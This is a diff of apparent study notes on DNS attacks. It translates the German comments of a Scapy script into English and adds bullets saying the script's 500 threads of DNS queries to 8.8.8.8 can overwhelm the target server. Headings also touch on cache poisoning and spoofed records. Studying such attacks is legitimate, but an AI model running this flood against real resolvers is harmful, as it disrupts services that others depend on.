@@ -59,19 +59,19 @@ dig +norecurse @192.168.122.7 foreman.de
 from scapy.all import *
 import threading
 
-# Ziel-DNS-Server
-target_dns_server = "8.8.8.8"  # Google's DNS Server als Beispiel
+# Target DNS Server
+target_dns_server = "8.8.8.8"  # Example: Google's DNS Server
 
-# Funktion zum Senden einer DNS-Anfrage
+# Function to send a DNS query
 def send_dns_request():
-    # Erstellen einer DNS-Anfrage für google.com
+    # Create a DNS query for google.com
     dns_request = IP(dst=target_dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
-    # Senden der DNS-Anfrage
+    # Send the DNS query
     send(dns_request)
 
-# Hauptlogik: Erzeugen einer großen Anzahl von Threads, die jeweils eine DNS-Anfrage senden
+# Main logic: Generate a large number of threads, each sending a DNS query
 if __name__ == "__main__":
-    # Anzahl der Threads, die gleichzeitig laufen sollen
+    # Number of threads to run simultaneously
     num_threads = 500
     
     threads = []
@@ -80,12 +80,20 @@ if __name__ == "__main__":
         thread.start()
         threads.append(thread)
     
-    # Warten, bis alle Threads abgeschlossen sind
+    # Wait until all threads are completed
     for thread in threads:
         thread.join()
 
-    print("Alle Threads abgeschlossen.")
+    print("All threads completed.")
+
 ```
+> - This Python script uses Scapy, a powerful packet manipulation program, to send DNS queries to a target DNS server.
+> - The `target_dns_server` variable specifies the DNS server to which the queries will be sent. In this example, it's set to Google's public DNS server (`8.8.8.8`).
+> - The `send_dns_request` function constructs a DNS query for `google.com` and sends it to the target DNS server.
+> - The main part of the script creates and starts a specified number of threads (`num_threads`) that execute the `send_dns_request` function concurrently.
+> - Each thread sends a DNS query, potentially overwhelming the target DNS server with a flood of requests.
+> - After starting all threads, the script waits for all of them to finish executing with `thread.join()`.
+> - Finally, it prints a message indicating that all threads have been completed.
 
 ### DNS Cache-Poisining
 
@@ -94,10 +102,6 @@ if __name__ == "__main__":
 
 - Attackers often target DNS servers that are not properly secured or configured, leading to successful redirection of traffic.
 - there are 2 main tatics used:
-> 
->     - a ***denial of service attack*** such as DDOS can generate latency, or kill the spoofed server in order to take it over 
->     -  
-
 ---
 
 ***Sending a fake record using spoofed ip***
